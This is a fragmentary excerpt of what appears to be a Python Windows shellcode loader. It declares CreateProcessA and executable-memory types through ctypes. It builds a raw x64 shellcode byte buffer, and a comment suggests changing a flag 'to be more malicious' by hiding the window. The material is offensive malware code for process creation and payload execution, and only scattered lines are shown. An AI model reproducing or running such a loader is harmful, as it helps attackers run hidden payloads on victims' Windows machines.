...
from scapy.arch.windows.structures import LPVOID
from win32con import PAGE_EXECUTE
...
LPTHREAD_START_ROUTIN = wintypes.LPVOID
...
CreateProcessA.argtypes = (wintypes.LPCSTR,
                           wintypes.LPSTR,
                           LPSECURITY_ATTRIBUTES,
                           LPSECURITY_ATTRIBUTES,
                           wintypes.BOOL,
...
buf += b"\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
buf += b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9"
...
#you can change to 0 and be more malicious, the window will be hidden.
